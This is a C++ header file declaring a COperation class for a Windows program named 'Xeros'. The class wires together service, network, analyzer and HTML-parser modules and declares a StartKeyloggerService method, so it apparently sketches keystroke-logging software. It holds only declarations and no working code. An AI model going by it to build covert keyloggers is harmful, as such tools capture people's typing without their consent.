#ifndef _OPERATION_
#define _OPERATION_

#include "..\Common\Common.h"
#include "..\Service\Service.h"
#include "..\RealTimeCheck\RealTimeCheck.h"
#include "..\MainOperation\Analyzer.h"
#include "..\MainOperation\Network\Network.h"
#include "..\MainOperation\SearchWord\SearchWordType.h"
#include "..\HTMLParser\HTMLReader.h"
#include "DataSingletonh.h"

#define SERVICE_NAME "Xeros"
#define FAIL_THRESHOLD 10

static HANDLE g_hEvent;

class COperation
{
	/*
		below variable is included in class
	*/
	CService		*m_pService;
	CRealTimeCheck	*m_pRealTimeCheck;
	CAnalyzer		*m_pAnalyzer;
	CNetwork		*m_pNetwork;
	CDataSingleton  *m_pDataSingleton;
	HANDLE			m_pDataBase;
	HANDLE			m_hThread;

	ST_HTML_URLS	m_stHTMLURLs;

	/*
		below variable is included in decision 
	*/
	BOOL m_bStartOperatoin;
	BOOL m_bCreateService;
	BOOL m_bStartService;
	BOOL m_bRealTimeCheck;

	/*
		below method is included in inner method for public
	*/
	DWORD StartKeyloggerService();
	DWORD StartRealTimeCheck();
	DWORD StartAnalysis(ST_PROPER_WORD_RET &refstProperWordRet);
	DWORD StartUrlQuery(ST_PROPER_WORD_RET &refstProperWordRet);
public:
	COperation(std::string strServiceFilePath);
	~COperation();

	DWORD StartOperation();
	DWORD StopOperation();

	void SetStartOperation(BOOL bValue);

	inline ST_HTML_URLS GetUrl() {
		return m_stHTMLURLs;
	}
};

//unsigned int __stdcall CheckEventThread(void *param);

#endif